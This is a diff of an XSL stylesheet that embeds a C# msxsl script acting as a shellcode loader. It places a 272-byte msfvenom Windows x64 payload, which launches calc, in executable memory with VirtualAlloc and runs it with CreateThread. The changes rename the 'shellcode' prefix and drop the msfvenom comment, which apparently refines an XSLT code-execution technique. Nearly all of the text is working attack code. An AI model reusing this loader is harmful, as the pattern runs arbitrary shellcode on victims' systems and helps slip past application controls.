@@ -1,11 +1,11 @@
 <xsl:stylesheet version="2.0"
                 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                 xmlns:msxsl="urn:schemas-microsoft-com:xslt"
-                xmlns:shellcode="urn:MyModule">
+                xmlns:shell="urn:MyModule">
 
-  <msxsl:script implements-prefix="shellcode" language="C#">
+  <msxsl:script implements-prefix="shell" language="C#">
   <msxsl:using namespace="System.Runtime.InteropServices" />  
-<![CDATA[
+  <![CDATA[
      private static UInt32 MEM_COMMIT = 0x1000;          
      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
      [DllImport("kernel32")]
@@ -25,10 +25,9 @@
         UInt32 dwMilliseconds
      );     
 
-	   public void Exec()
-     {	    
-	         #msfvenom --payload  windows/x64/exec CMD="calc" EXITFUNC=thread -f csharp
-           byte[] shellcode = new new byte[272] {
+     public void Exec()
+     {      
+           byte[] shellcode = new byte[272] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
@@ -47,7 +46,7 @@
 0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
 0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
 0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
-0x63,0x00 };
+0x63,0x00 };              
               
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
@@ -57,12 +56,12 @@
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);            
     }
-]]>
+    ]]>
   </msxsl:script>
 
   <xsl:template match="data">
     <result>
-      <xsl:value-of select="shellcode:Exec()" />
+      <xsl:value-of select="shell:Exec()" />
     </result>
   </xsl:template>
 </xsl:stylesheet>
